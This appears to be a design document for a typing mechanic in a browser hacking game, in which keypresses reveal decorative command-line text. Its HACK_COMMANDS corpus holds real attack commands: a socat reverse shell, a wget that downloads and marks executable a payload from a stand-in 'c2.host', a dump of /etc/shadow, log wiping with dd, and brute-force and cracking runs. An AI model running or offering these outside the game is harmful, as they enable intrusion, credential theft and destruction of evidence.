# Uplink Game: Hacker Typer Mechanic

**Date:** 2026-04-13
**Status:** Approved
**Scope:** `packages/remotes/uplink-game/src/game/scenes/HackScene.ts`

## Problem

The HackScene is entirely passive once a tool is activated — click a button, watch a bar fill, wait. There's no player input during the hack. Adding a typing mechanic introduces active engagement and matches the hacker-typer fantasy (hackertyper.net) without changing the core game structure.

## Mechanic Overview

**Activate → Type → Complete**

1. Player clicks a tool button (same as before) — tool enters active state, label changes to `[TYPE TO HACK...]`
2. Any keypress advances the tool's progress bar and reveals the next character from a CLI command corpus in the log panel
3. While idle (no keypresses for ~500ms): bar decays slowly, trace ticks 2× faster
4. Bar hits 100% → tool completes, next tool unlocks (same completion path as before)

## Input & Progress

- Any key counts — no specific key required
- Progress increment per keypress: `100 / keystrokeTarget`
- Keystroke targets per tool (proportional to original durations):
  - CRACK PASSWORD: 50 keystrokes
  - BYPASS FIREWALL: 35 keystrokes
  - WIPE LOGS: 8 keystrokes

## Idle Behaviour

Both penalties apply simultaneously when idle during an active tool:

- **Bar decay**: −0.3% per 100ms (after 500ms idle threshold)
- **Trace acceleration**: trace ticks 2× faster while idle

Bar drains to 0 but tool stays in `running` state — player can retype to refill. No separate failure state on the bar; only the trace reaching 100% ends the run.

## Log Content

Two independent streams in the log panel:

- **Auto-timer** (unchanged): fires narrative lines every 2500ms from `LOG_LINES`
- **Typing**: each keypress reveals the next character from `HACK_COMMANDS` corpus, char-by-char into a live log line. When a command completes, it becomes a new line and the next command starts.

```ts
const HACK_COMMANDS = [
  'nmap -sS -p 22,80,443 192.168.1.1',
  'ssh-keygen -t rsa -b 4096 -f ./id_hack',
  'openssl enc -d -aes256 -in payload.bin',
  'hydra -l admin -P rockyou.txt ssh://target',
  'tcpdump -i eth0 -w capture.pcap',
  'curl -s http://target/admin --cookie "auth=1"',
  'john --wordlist=rockyou.txt hashes.txt',
  'nc -lvnp 4444',
  'msfconsole -x "use exploit/multi/handler"',
  'python3 exploit.py --target 192.168.1.1 --port 22',
  'grep -r "password" /etc/ 2>/dev/null',
  'cat /etc/shadow | cut -d: -f1,2',
  'iptables -A INPUT -p tcp --dport 22 -j DROP',
  'dd if=/dev/urandom of=/var/log/auth.log',
  'ssh -D 9050 -fN root@proxy.onion',
  'proxychains nmap -sT -p- target',
  'hashcat -m 1800 -a 0 hash.txt rockyou.txt',
  'socat TCP:192.168.1.1:443 EXEC:/bin/bash',
  'wget -q http://c2.host/payload -O /tmp/.x && chmod +x /tmp/.x',
  'strace -p $(pgrep sshd) -e trace=read,write',
];
```

Corpus loops back to index 0 when exhausted.

## New State (HackScene)

```ts
private activeToolIndex: number | null = null;
private lastKeypressTime = 0;
private toolProgress: number[] = [];       // 0–100 per tool, replaces tween
private keystrokeTargets = [50, 35, 8];
private commandCorpus = HACK_COMMANDS;
private corpusIndex = 0;
private corpusCharIndex = 0;
private typingLogText: Phaser.GameObjects.Text | null = null;
```

## What Changes in HackScene.ts

| Area | Change |
|------|--------|
| `init()` | Initialise `toolProgress = [0,0,0]`, reset corpus indices |
| `create()` | Register `this.input.keyboard.on('keydown', this.onKeyDown, this)` |
| `pointerdown` handler | Set `activeToolIndex = index`, update label — no tween started |
| `onKeyDown()` | New method: advance progress, reveal corpus char, update bar graphics |
| `update()` | New method: apply decay + trace acceleration when idle |
| `drawToolButton()` | Unchanged |
| `updateTraceBar()` | Unchanged |
| `addLogLine()` | Unchanged (auto-timer path) |
| Tween (`addCounter`) | Removed from tool activation |

## Verification

- Clicking a tool → label changes to `[TYPE TO HACK...]`, no bar movement until keystroke
- Typing → bar advances, CLI command chars appear in log
- Stop typing 500ms → bar visibly drains, trace accelerates
- Resume typing → decay stops, trace returns to normal rate
- Bar hits 100% → tool completes, next tool unlocks
- All tools done → `MissionEndScene` success as before
- Trace hits 100% → `MissionEndScene` failure as before
